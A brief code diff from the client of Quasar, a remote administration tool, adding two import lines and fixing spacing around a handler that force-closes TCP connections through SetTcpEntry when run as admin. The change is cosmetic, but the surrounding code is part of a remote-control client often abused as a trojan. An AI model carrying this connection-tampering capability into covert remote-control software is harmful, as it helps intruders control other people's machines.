@@ -1,6 +1,8 @@
 ﻿using Quasar.Client.Utilities;
 using Quasar.Common.Enums;
 using Quasar.Common.Messages;
+using Quasar.Common.Messages.Administration.TCPConnections;
+using Quasar.Common.Messages.other;
 using Quasar.Common.Models;
 using Quasar.Common.Networking;
 using System;
@@ -74,7 +76,7 @@ namespace Quasar.Client.Messages
                     message.RemotePort == table[i].RemotePort)
                 {
                     // it will close the connection only if client run as admin
-                    table[i].state = (byte)ConnectionState.Delete_TCB;
+                    table[i].state = (byte) ConnectionState.Delete_TCB;
                     var ptr = Marshal.AllocCoTaskMem(Marshal.SizeOf(table[i]));
                     Marshal.StructureToPtr(table[i], ptr, false);
                     NativeMethods.SetTcpEntry(ptr);
